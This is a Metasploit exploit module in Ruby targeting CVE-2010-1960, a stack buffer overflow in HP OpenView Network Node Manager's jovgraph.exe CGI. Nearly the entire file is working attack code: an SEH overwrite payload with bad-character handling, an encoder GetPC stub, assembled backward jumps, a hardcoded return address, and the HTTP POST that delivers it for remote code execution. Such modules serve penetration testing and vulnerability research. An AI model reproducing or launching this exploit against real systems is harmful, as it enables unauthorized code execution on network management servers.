# $Id: hp_nnm_ovwebsnmpsrv_uro.rb 12095 2011-03-23 15:43:25Z jduck $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    HttpFingerPrint = { :method => &#039;HEAD&#039;, :uri => &#039;/OvCgi/jovgraph.exe&#039;, :pattern => /Hewlett-Packard Development Company/ }
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
                prior to NNM_01203. By specifying a long &#039;arg&#039; parameter when executing the &#039;jovgraph.exe&#039;
                CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.
                The vulnerable code is within the option parsing function within "ovwebsnmpsrv.exe" with a
                timestamp prior to April 7th, 2010.
 
                Reaching the vulnerable code requires a &#039;POST&#039; request with an &#039;arg&#039; parameter that, when combined
                with a some static text, exceeds 10240 bytes. The parameter must begin with a dash. It is
                important to note that this vulnerability must be exploited by overwriting SEH. This is since
                overflowing the buffer with controllable data always triggers an access violation when
                attempting to write static text beyond the end of the stack.
 
                Exploiting this issue is a bit tricky due to a restrictive character set. In order to accomplish
                arbitrary code execution, a double-backward jump is used in combination with the Alpha2
                encoder.
            } ,
            &#039;Author&#039;         =>
                [
                    &#039;jduck&#039;   # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 12095 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2010-1960&#039; ],
                    [ &#039;OSVDB&#039;, &#039;65427&#039; ],
                    [ &#039;BID&#039;, &#039;40637&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-10-105/&#039; ],
                    [ &#039;URL&#039;, &#039;http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02217439&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 10240, # 10240 byte buffer..
                    # In addition to regular HTTP type bad chars, this one also has
                    # an issue with " since the buffer is being passed on the command line.
                    &#039;BadChars&#039; => (0x00..0x1f).to_a.pack(&#039;C*&#039;) + "\x20\x21\x22\x24\x2c\x3b\x3c\x3e\x60",
                    &#039;DisableNops&#039; => true,
                    # Manually use FPU to get EIP into ECX
                    &#039;PrependEncoder&#039; => "\x89\xe2\xdb\xdb\xd9\x72\xf4\x59\x83\xe9\xf7",
                    &#039;EncoderOptions&#039; => { &#039;BufferRegister&#039; => &#039;ecx&#039; },
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;HP OpenView Network Node Manager 7.53 w/NNM_01206&#039;,
                        {
                            &#039;Ret&#039;     => 0x5a238ba7, # pop edx/pop ebp/ret - in ovsnmp.dll v1.30.10.9166
                        }
                    ],
                    [ &#039;Debug Target&#039;,
                        {
                            &#039;Ret&#039;     => 0xdeadbeef, # crasher
                        }
                    ]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;June 08 2010&#039;))
 
        register_options(
            [
                Opt::RPORT(80),
            ], self.class)
    end
 
    def exploit
 
        print_status("Trying target #{target.name}...")
 
        cgi = &#039;/OvCgi/jovgraph.exe&#039;
 
        # A long command line option (starts with -) will cause a buffer overflow.
 
        # Action just has to be set, doesn&#039;t matter what it is.
        action = rand_text_alphanumeric(1)
 
        # "timestamp" cannot be set.
 
        start = &#039;Unrecognized option: &#039;
 
        # SEH
        seh_offset = 0x2cb0  # 0x13ffb0 - 0x13d300
        seh_frame = generate_seh_record(target.ret)
 
        # Jump back to the payload, after p/p/r jumps to us.
        # NOTE: Putting the jmp_back after the SEH handler seems to avoid problems with badchars..
        # 8 for SEH.Next+SEH.Func, 5 for the jmp_back itself
        distance = seh_offset - 1 + seh_frame.length # dry run
        jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
        distance = seh_offset - start.length - 1 - jmp_back.length
        jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
 
        # A short jump back to the long jump back :)
        jmp_small = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + jmp_back.length.to_s).encode_string
        jmp_small << rand_text(2)
 
        buf = &#039;-&#039;
        buf << payload.encoded
        buf << "A" * (seh_offset - start.length - buf.length - jmp_back.length)
        buf << jmp_back
        buf << jmp_small
        buf << [target.ret].pack(&#039;V&#039;)
 
        # Send the request
        res = send_request_cgi({
            &#039;uri&#039;         => cgi,
            &#039;method&#039;      => "POST",
            &#039;vars_post&#039; =>
                {
                    &#039;act&#039; => action,
                    &#039;arg&#039; => buf,
                }
        }, 3)
 
        if res and res.code != 502
            print_error("Eek! We weren&#039;t expecting a response, but we got one")
            print_status(res.inspect) if datastore[&#039;NNM_DEBUG&#039;]
        end
 
        handler
 
    end
 
end



